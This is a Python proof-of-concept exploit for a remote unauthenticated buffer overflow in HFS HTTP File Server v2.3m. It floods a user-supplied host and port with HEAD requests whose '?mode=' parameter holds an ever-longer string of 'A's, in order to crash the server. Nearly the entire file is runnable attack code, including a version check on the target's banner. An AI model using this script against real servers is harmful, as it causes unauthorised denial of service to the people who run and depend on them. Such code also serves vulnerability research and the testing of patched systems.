from socket import *
import time,sys

#HFS HTTP File Server v2.3m build 300.
#Vendor: www.rejetto.com
#Remote Unauthenticated Buffer Overflow
#Note: hfs.exe must have at least one saved virtual file or folder on the target
#also test using a remote IP and not on same machine in order for success PoC.
#By Hyp3rlinx
#ISR: ApparitionSec
#=========================================================================
res=""
once=0
cnt=0
max_requests=1666


def hfs_dos():
    
    global ip,port,length,res,once,cnt,max_requests

    cnt+=1
    
    length += 1
    payload = "A"*length
    
    try:
        s=socket(AF_INET, SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,port)) 
        #bof ="HEAD / HTTP/1.1\r\nHost: "+ip+"Cookie: "+payload+"\r\n\r\n"
        bof ="HEAD /?mode="+payload+" HTTP/1.1\r\nHost: "+ip+"\r\n\r\n"
        s.send(bof.encode("utf-8"))
        if once==0:
            once+=1
            res = s.recv(128)
            if res != "":
                print("Targets up please wait...")
                if "HFS 2.3m" not in str(res):
                    print("[!] Non vulnerable HFS version, exiting :(")
                    exit()
    except Exception as e:
        if e != None:
            if str(e).find("timed out")!=-1:
                if res=="":
                    print("[!] Target is not up or behind a firewall? :(")
                    exit()
                else:
                    print("[!] Done!")
                    exit()
    s.close()

    if cnt == max_requests:
        return False
    return True


def msg():
    print("HFS HTTP File Server v2.3m build 300.")
    print("Unauthenticated Remote Buffer Overflow (DoS - PoC)")
    print("Virtual HFS saved file or folder required for success.")
    print("By Hyp3rlinx - ApparitionSec\n")

if __name__=="__main__":

    length=3

    if len(sys.argv) != 3:
        msg()
        print("Usage: <hfs.exe Server>, <Port>")
        exit()

    ip = sys.argv[1]
    port = int(sys.argv[2])

    msg()

    while True:
        if not hfs_dos():
            print("[!] Failed, non vuln version or no virtual files exist :(")
            break

